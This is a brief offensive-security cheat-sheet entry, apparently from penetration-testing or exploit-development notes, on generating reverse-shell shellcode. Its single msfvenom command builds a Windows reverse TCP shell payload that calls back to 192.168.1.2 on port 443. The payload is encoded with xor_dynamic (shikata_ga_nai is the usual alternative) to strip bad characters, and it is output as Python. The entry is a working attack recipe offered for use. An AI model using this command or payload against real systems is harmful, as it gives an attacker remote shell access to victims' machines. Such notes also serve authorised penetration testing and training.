## Generate reverse shell shellcode payload

Normally use `x86/shikata_ga_nai` but if that is not stable then use `x86/xor_dynamic`

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 EXITFUNC=thread -e x86/xor_dynamic  -b "\x00\x0d" -f python
```

